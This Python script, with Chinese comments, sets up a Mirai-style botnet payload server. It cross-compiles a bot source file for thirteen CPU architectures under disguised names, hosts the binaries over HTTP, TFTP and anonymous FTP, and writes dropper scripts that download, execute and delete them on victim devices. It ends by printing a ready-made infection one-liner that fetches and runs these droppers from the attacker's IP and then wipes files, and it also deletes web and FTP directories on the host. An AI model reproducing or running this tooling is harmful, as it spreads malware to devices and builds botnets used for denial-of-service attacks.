#我是懒狗
import subprocess
import sys
import base64

if len(sys.argv) < 3 or not sys.argv[2]:  # 修改参数检查逻辑
    print("\x1b[0;31mIncorrect Usage!")
    print(f"\x1b[0;32mUsage: python {sys.argv[0]} <BOTNAME.C> <IPADDR> \x1b[0m")
    exit(1)

ip = sys.argv[2]
bot = sys.argv[1]

yourafag = input("是否下载交叉编译器包?! Y/n: ")  # raw_input改为input
get_arch = yourafag.lower() == "y"

compileas = ["earyzq", #mips
             "114514", #mipsel
             "1919810", #sh4
             "cnmb", #x86
             "cnmcnm", #Armv6l
             "nmsl", #i686
             "ldagoujiao", #ppc
             "dingdongj", #i586
             "hajimi", #m68k
             "hsdjafdbasf",
             "atxhua",
              "qtmzbn",
               "adcvds"]

getarch = [
    'https://raw.githubusercontent.com/illusionsec/DDOS-archive/refs/heads/main/RootSec/uclib-cross-compilers/cross-compiler-mips.tar.bz2',
    'https://raw.githubusercontent.com/illusionsec/DDOS-archive/refs/heads/main/RootSec/uclib-cross-compilers/cross-compiler-mipsel.tar.bz2',
    'https://raw.githubusercontent.com/illusionsec/DDOS-archive/refs/heads/main/RootSec/uclib-cross-compilers/cross-compiler-sh4.tar.bz2',
    'https://raw.githubusercontent.com/illusionsec/DDOS-archive/refs/heads/main/RootSec/uclib-cross-compilers/cross-compiler-x86_64.tar.bz2',
    'https://raw.githubusercontent.com/illusionsec/DDOS-archive/refs/heads/main/RootSec/uclib-cross-compilers/cross-compiler-armv6l.tar.bz2',
    'https://raw.githubusercontent.com/illusionsec/DDOS-archive/refs/heads/main/RootSec/uclib-cross-compilers/cross-compiler-i686.tar.bz2',
    'https://raw.githubusercontent.com/illusionsec/DDOS-archive/refs/heads/main/RootSec/uclib-cross-compilers/cross-compiler-powerpc.tar.bz2',
    'https://raw.githubusercontent.com/illusionsec/DDOS-archive/refs/heads/main/RootSec/uclib-cross-compilers/cross-compiler-i586.tar.bz2',
    'https://raw.githubusercontent.com/illusionsec/DDOS-archive/refs/heads/main/RootSec/uclib-cross-compilers/cross-compiler-m68k.tar.bz2',
    'https://raw.githubusercontent.com/illusionsec/DDOS-archive/refs/heads/main/RootSec/uclib-cross-compilers/cross-compiler-sparc.tar.bz2',
    'https://raw.githubusercontent.com/illusionsec/DDOS-archive/refs/heads/main/RootSec/uclib-cross-compilers/cross-compiler-armv4l.tar.bz2',
    'https://raw.githubusercontent.com/illusionsec/DDOS-archive/refs/heads/main/RootSec/uclib-cross-compilers/cross-compiler-armv5l.tar.bz2',
    'https://raw.githubusercontent.com/illusionsec/DDOS-archive/refs/heads/main/RootSec/uclib-cross-compilers/cross-compiler-powerpc-440fp.tar.bz2'
]

ccs = [
    "cross-compiler-mips",
    "cross-compiler-mipsel",
    "cross-compiler-sh4",
    "cross-compiler-x86_64",
    "cross-compiler-armv6l",
    "cross-compiler-i686",
    "cross-compiler-powerpc",
    "cross-compiler-i586",
    "cross-compiler-m68k",
    "cross-compiler-sparc",
    "cross-compiler-armv4l",
    "cross-compiler-armv5l",
    "cross-compiler-powerpc-440fp"
]

def run(cmd):
    subprocess.call(cmd, shell=True)

run("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")
run("yum install wget -y && yum install bzip2 -y")

if get_arch:
    run("rm -rf cross-compiler-*")
    print("Downloading Architectures")
    for arch in getarch:
        run(f"wget {arch} --no-check-certificate >> /dev/null")
        run("tar -xvf *tar.bz2")
        run("rm -rf *tar.bz2")
    print("Cross Compilers Downloaded...")

num = 0
for cc in ccs:
    arch = cc.split("-")[2]
    run(f"./{cc}/bin/{arch}-gcc -static -pthread -D{arch.upper()} -o {compileas[num]} {bot} > /dev/null")
    num += 1

print("Cross Compiling Done!")
print("Setting up your httpd and tftp")

run("yum install httpd -y")
run("service httpd start")
run("yum install xinetd tftp tftp-server -y")
run("yum install vsftpd -y")
run("service vsftpd start")

with open('/etc/xinetd.d/tftp', 'w') as f:
    f.write("""# default: off
# description: The tftp server serves files using the trivial file transfer \\
#       protocol.  The tftp protocol is often used to boot diskless \\
#       workstations, download configuration files to network-aware printers, \\
#       and to start the installation process for some operating systems.
service tftp
{
        socket_type             = dgram
        protocol                = udp
        wait                    = yes
        user                    = root
        server                  = /usr/sbin/in.tftpd
        server_args             = -s -c /var/lib/tftpboot
        disable                 = no
        per_source              = 11
        cps                     = 100 2
        flags                   = IPv4
}
""")

run("service xinetd start")

with open('/etc/vsftpd/vsftpd-anon.conf', 'w') as f:
    f.write(f"""listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address={ip}
listen_port=21
""")

run("service vsftpd restart")

for i in compileas:
    run(f"cp {i} /var/www/html")
    run(f"cp {i} /var/ftp")
    run(f"mv {i} /var/lib/tftpboot")

with open('/var/lib/tftpboot/tftp1.sh', 'w') as f:
    f.write("""#!/bin/bash
ulimit -n 1024
cp /bin/busybox /tmp/
""")

with open('/var/lib/tftpboot/tftp2.sh', 'w') as f:
    f.write("""#!/bin/bash
ulimit -n 1024
cp /bin/busybox /tmp/
""")

with open('/var/www/html/bins.sh', 'w') as f:
    f.write("#!/bin/bash\n")

for i in compileas:
    # 更新字符串格式化方式
    with open('/var/www/html/bins.sh', 'a') as f:
        f.write(f'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://{ip}/{i}; chmod +x {i}; ./{i}; rm -rf {i}\n')
    
    with open('/var/ftp/ftp1.sh', 'a') as f:
        f.write(f'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 {ip} {i} {i}; chmod 777 {i} ./{i}; rm -rf {i}\n')
    
    with open('/var/lib/tftpboot/tftp1.sh', 'a') as f:
        f.write(f'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp {ip} -c get {i};cat {i} >badbox;chmod +x *;./badbox\n')
    
    with open('/var/lib/tftpboot/tftp2.sh', 'a') as f:
        f.write(f'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r {i} -g {ip};cat {i} >badbox;chmod +x *;./badbox\n')

run("service xinetd restart")
run("service httpd restart")
run("echo 'ulimit -n 99999' >> ~/.bashrc")

print("\x1b[0;32m编译完成!\x1b[0m")
print(f"\x1b[0;32m你的传马命令是: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://{ip}/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp {ip} -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g {ip}; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 {ip} ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\x1b[0m")
